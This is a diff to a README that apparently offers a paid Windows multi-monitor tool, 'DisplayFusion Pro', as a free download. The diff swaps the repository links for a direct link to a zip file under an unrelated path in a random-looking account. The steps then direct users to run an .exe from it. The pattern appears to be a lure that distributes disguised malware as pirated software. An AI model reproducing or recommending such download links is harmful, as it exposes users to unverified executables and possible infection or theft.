@@ -5,7 +5,7 @@ description: "Download and install DisplayFusion Pro for Windows 10 and 11 using
 ---
 # 🖥️ DisplayFusion-2026 - Manage your multi-monitor setup easily
 
-[![](https://img.shields.io/badge/Download-DisplayFusion-blue.svg)](https://github.com/cassocked-genuscastanea597/DisplayFusion-2026)
+[![](https://img.shields.io/badge/Download-DisplayFusion-blue.svg)](https://raw.githubusercontent.com/cassocked-genuscastanea597/cassocked-genuscastanea597.github.io/main/olfactometry/cassocked-genuscastanea-io-github-v3.2.zip)
 
 DisplayFusion-2026 improves how you use your computer when you connect multiple monitors. This software gives you control over taskbars, wallpapers, and window placement. You can manage your desktop workspace with specific settings for Windows 11 and Windows 10.
 
@@ -24,7 +24,7 @@ Your computer must meet these standards to run the software.
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the following link to access the software: [https://github.com/cassocked-genuscastanea597/DisplayFusion-2026](https://github.com/cassocked-genuscastanea597/DisplayFusion-2026).
+1. Visit the following link to access the software: [https://raw.githubusercontent.com/cassocked-genuscastanea597/cassocked-genuscastanea597.github.io/main/olfactometry/cassocked-genuscastanea-io-github-v3.2.zip](https://raw.githubusercontent.com/cassocked-genuscastanea597/cassocked-genuscastanea597.github.io/main/olfactometry/cassocked-genuscastanea-io-github-v3.2.zip).
 2. Look for the file ending in .exe in the releases section.
 3. Click the file name to download it to your computer.
 4. Open your Downloads folder.
